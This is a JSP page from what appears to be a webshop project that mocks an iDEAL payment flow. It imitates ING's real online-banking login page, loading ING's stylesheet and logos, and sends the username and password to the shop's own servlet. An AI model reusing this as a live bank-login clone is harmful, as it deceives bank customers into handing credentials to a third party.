<%@page import="classes.domain.Order"%>
<%@page import="classes.domain.Cart"%>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<%@include file="/pages/langInclude.jsp" %>
<link rel="stylesheet" href="https://mijn.ing.nl/internetbankieren/css/ses_style_v7.css">
<html>
    <%
        Cart cart = Cart.readCartFromCookies(request);
        if (cart != null) {
            request.setAttribute("orders", cart.getOverview());
            request.setAttribute("orderCount", cart.getOverview().length);
            request.setAttribute("cart", cart);
        } else {
            request.setAttribute("orders", new Order[]{});
            request.setAttribute("orderCount", 0);
            request.setAttribute("cart", new Cart());
        }
    %>

    <c:set var="login_message">
        <c:choose>
            <c:when test="${pageContext.session.getAttribute('login_message') == 1}">
                <fmt:message key="login.response.invalid"/>
            </c:when>
            <c:when test="${pageContext.session.getAttribute('login_message') == 2}">
                <fmt:message key="login.response.disabled"/>
            </c:when>
            <c:when test="${pageContext.session.getAttribute('login_message') == 3}">
                <fmt:message key="login.response.empty"/>
            </c:when>
        </c:choose>
    </c:set>
    <c:set var="buttontext"><fmt:message key="login.button.submit"/></c:set>
        <body>
        <c:if test="${pageContext.session.getAttribute('bankFlow') == 'choice'}">
            <div id="header-top">
                <img src="https://static.webshopapp.com/shops/084012/files/035267280/ideal-logo-png.png" width="75px" />
            </div>
            <form role="form" action="../PaymentServlet" method="POST">
                <select name="bankChoice">
                    <option>ABN Amro</option>
                    <option>ING</option>
                    <option>Rabobank</option>
                    <option>SNS Bank</option>
                </select>
                <input type="submit" value="${buttontext}">
            </form>
        </c:if>
        <c:if test="${pageContext.session.getAttribute('bankFlow') == 'login'}">
            <div class="header">
                <div class="header-top">
                    <a href="https://www.ing.nl/?bid=0035_Adm_Rest_Mass_inte_Mijn_ING_inlogpagina_logo_Link">
                        <img id="ing-logo" src="https://mijn.ing.nl/internetbankieren/gfx/SES_logo_ing.gif" alt="ING Logo" height="32" Width="128"/>
                    </a>

                    <div class="header-menu">
                        <a href="https://www.ing.nl/particulier/klantenservice/index.html" target="_blank" title="Klantenservice" >Klantenservice</a>
                        <a href="https://www.ing.nl/particulier/klantenservice/contact/index.html" target="_blank" title="Contact" >Contact</a>
                    </div>
                </div>
            </div>
            <div class="content">
                <div class="content">
                    <h1 id="header-pagetitle" class="header-pagetitle rockwell">Inloggen Mijn ING&nbsp;</h1>
                    <p>
                        Vul alleen uw gegevens in wanneer de adresregel in uw browser begint met https://mijn.ing.nl/internetbankieren. Twijfelt u? Kijk dan op de <a href="https://www.ing.nl/de-ing/veilig-bankieren/veilig-bankzaken-regelen/veilig-bankzaken-regelen-met-mijn-ing/veilige-verbinding/index.html?bid=0000_Rest_Internetbankieren_veilig_inloggen_introtekst_inlogscherm_link" target="_&quot;blank&quot;">checklist veilig inloggen</a>.<br>
                        Wilt u inloggen met uw smartphone? Wij adviseren u om dit met de <a href="https://www.ing.nl/particulier/mobiel/mobiel-bankieren/index.html" target="_blank">Mobiel Bankieren App</a> te doen.
                    </p>


                    <ul class="home-tabnavigator-main">
                        <li class="home-tabnavigator active"><a href="https://mijn.ing.nl/internetbankieren/SesamLoginServlet" title="Particulier"><span>Particulier</span></a></li><li class="home-tabnavigator"><a href="https://mijnzakelijk.ing.nl/internetbankieren/SesamLoginServlet" title="Zakelijk"><span>Zakelijk</span></a></li>
                        <li><!-- 1-42-16 --></li>
                    </ul>

                    <div id="focusblock" class="focusblock clearfix login">

                        <div class="wrapper-header clearfix">

                            <div class="wrapper-left-header"><h3></h3></div>
                            <div class="wrapper-right-header"><h3>Belangrijke mededelingen</h3></div>
                        </div>

                        <div class="wrapper-content wrapper-content-rounded-corners">

                            <div class="wrapper-left-content">

                                <form id="login" name="login" role="form" action="../PaymentServlet" method="POST">

                                    <font style="color: red;">${login_message}</font>


                                    <div id="gebruikersnaam" class="form_element">


                                        <label for="a1k41h36rtCMKHUrG">Gebruikersnaam</label>

                                        <div class="tooltip-icon"></div>

                                        <input type="text" placeholder="${username}" name="username" autofocus>
                                    </div>

                                    <div id="wachtwoord" class="form_element">

                                        <label for="ayLUn4B5y8zN82XrD">Wachtwoord</label>

                                        <div class="tooltip-icon"></div>


                                        <input type="password" placeholder="${password}" name="password">

                                        <div class="notification hide-element">

                                            <div class="notification-icon notification-error"></div>

                                            <div class="notification-message">

                                            </div>
                                        </div>  

                                    </div>


                                    <div class="form_element nolabel">

                                        <input type="checkbox" name="akVx7pztmamdazO9d" tabindex="3" id="akVx7pztmamdazO9d"><label for="akVx7pztmamdazO9d">Onthoud mijn gebruikersnaam</label>

                                    </div>

                                    <div class="form_element nolabel">
                                        <button class="submit" type="submit" title="Inloggen" tabindex="4"><span>Inloggen</span></button>
                                    </div>

                                    <div class="form_element nolabel">
                                        <a href="https://inlogcodes.mijn.ing.nl/particulier/zelf-regelen/instellen/inlogcodes/index.jsp" title="" class="link">Nieuw wachtwoord en/of gebruikersnaam aanvragen</a><br><a class="link" href="https://aanvragen.ing.nl/particulier/aanvragen/aanvraagframe.html">Mijn ING aanvragen</a>
                                    </div>
                                    <script language="javascript">
                                        document.write("<INPUT TYPE='hidden' name='aJsGiVMkFWvRASJBh' value='" + urlEncode(add_deviceprint()) + "'>");
                                    </script><input type="hidden" name="aJsGiVMkFWvRASJBh" value="version%3D2%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20wow64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F47%2E0%2E2526%2E106%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20WOW64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F47%2E0%2E2526%2E106%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1366%7C768%7C738%26pm%5Ffpsw%3D%26pm%5Ffptz%3D1%26pm%5Ffpln%3Dlang%3Dnl%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dwidevinecdmadapter%7Cpepflashplayer%7Cmhjfbmdgcfjbbpaeojofohoefgiehjai%7Cinternal%2Dnacl%2Dplugin%7Cinternal%2Dpdf%2Dviewer%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1366%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D">

                                    <input type="hidden" name="Target" id="Target" value="">
                                    <input type="hidden" name="lptr" id="lptr" value="{&quot;v4a&quot;:{&quot;r&quot;:&quot;0&quot;},&quot;v4b&quot;:{&quot;f&quot;:&quot;0&quot;},&quot;v7&quot;:{&quot;s&quot;:&quot;&quot;},&quot;v4&quot;:{&quot;j&quot;:&quot;&quot;},&quot;timestamp&quot;:&quot;2016-01-12 10:51:54&quot;,&quot;ki&quot;:&quot;1&quot;,&quot;v6&quot;:{&quot;u&quot;:&quot;&quot;,&quot;k&quot;:&quot;&quot;}}"><input type="hidden" name="lpts" id="lpts" value="0e32af3d657024f2c13204755c49972b324c2c0588de61fe4089bed83c2f0698"></form>	

                            </div>

                            <div class="wrapper-right-content">
                                <div class="cmstext">
                                    <ul> 
                                        <li><a href="https://www.ing.nl/de-ing/veilig-bankieren/belangrijke-mededelingen/toename-fraude-door-malware-op-pc-en-telefoon.html" target="_blank" class="bold">Toename fraude door malware op PC en telefoon</a></li>
                                        <li><a href="https://www.ing.nl/de-ing/veilig-bankieren/5Bs-van-veilig-bankieren/bescherm-uw-codes/hoe-sterk-is-uw-wachtwoord.html" target="_blank" class="bold">Tips voor het gebruik van een sterk wachtwoord</a></li>
                                        <!--<li><a href="#" target="_blank" class="bold">Tenaamstelling bij incasso mogelijk onjuist</a></li>-->
                                        <!--<li><a target="_blank" href="http://www.ing.nl/shortcut/ming/page/onderhoud-ming">Gepland onderhoud Mijn ING (99-99-9999, 1.00 - 6.00 uur)</a></li>-->
                                    </ul>		
                                </div>
                            </div>

                            <div class="wrapper-right-content wrapper-subcontent">
                                <div class="cmstext">
                                    <span>Meer informatie:</span>
                                    <ul>
                                        <li><a href="https://www.ing.nl/particulier/internetbankieren/internetbankieren/mijn-ing/index.html" title="Informatie Mijn ING" target="_blank">Mijn ING</a></li>
                                        <li><a href="https://www.ing.nl/particulier/internetbankieren/internetbankieren/hulp-bij-inloggen/index.html" title="Hulp bij inloggen" target="_blank"><b>Hulp bij inloggen</b></a></li>
                                        <li><a href="https://www.ing.nl/particulier/mobiel/mobiel-bankieren/index.html" title="Mobiel Bankieren App" target="_blank">Mobiel Bankieren App</a></li>
                                        <li><a href="https://www.ing.nl/de-ing/veilig-bankieren/index.html" title="Alles over veilig internetbankieren" target="_blank">Veilig bankieren</a></li>
                                        <li><a href="https://www.ing.nl/particulier/internetbankieren/internetbankieren/mijn-ing/internationale-handleiding-mijn-ing.html" title="Handleiding in Nederlands, English, Deutsch, Polskim, Türkçe, Español, العربية" target="_blank">Handleiding in Nederlands, English, Deutsch, Polskim, Türkçe, Español, العربية</a></li>
                                    </ul>
                                </div>
                            </div>						
                        </div>			
                    </div>



                </div>




            </div>
        </c:if>
        <c:if test="${pageContext.session.getAttribute('bankFlow') == 'pay'}">
             <div class="header">
                <div class="header-top">
                    <a href="https://www.ing.nl/?bid=0035_Adm_Rest_Mass_inte_Mijn_ING_inlogpagina_logo_Link">
                        <img id="ing-logo" src="https://mijn.ing.nl/internetbankieren/gfx/SES_logo_ing.gif" alt="ING Logo" height="32" Width="128"/>
                    </a>

                    <div class="header-menu">
                        <a href="https://www.ing.nl/particulier/klantenservice/index.html" target="_blank" title="Klantenservice" >Klantenservice</a>
                        <a href="https://www.ing.nl/particulier/klantenservice/contact/index.html" target="_blank" title="Contact" >Contact</a>
                    </div>
                </div>
            </div>
            
            <div class="content">
                <div class="content">
                    <h1 id="header-pagetitle" class="header-pagetitle rockwell">Betaling</h1>
     

                    <ul class="home-tabnavigator-main">
                        <li class="home-tabnavigator active"><a href="" title="Particulier"><span>Bevestiging</span></a></</li>
                        <li><!-- 1-42-16 --></li>
                    </ul>

                    <div id="focusblock" class="focusblock clearfix login">

                        <div class="wrapper-header clearfix">

                            <div class="wrapper-left-header"></div>
                        </div>


                            <div class="wrapper-left-content">
                                Om de betaling te voltooien moet u de ,hieronder genoemde bedrag, betalen.
                                
                                <h2>Totaalbedrag: <h1>${cart.getTotalPriceAndBTWFormat(21)}</h1></h2>
                                    <form action="../PaymentServlet" method="POST">
                                            <input type="hidden" name="amount" value="${cart.getTotalPriceAndBTWFormat(21)}">
                                            <input type="hidden" name="pay" value="confirm">
                                             <div class="form_element nolabel">
                                                <button class="submit" type="submit" title="Inloggen" tabindex="4"><span>${buttontext}</span></button>
                                            </div>
                                        </form>
                                
                                 <font style="color: red;">${login_message}</font>



                                   

                                
                                    
                                   
                            </div>
		
                    </div>



                </div>




            </div>
            
            
            
        </c:if>
    <body>
</html>

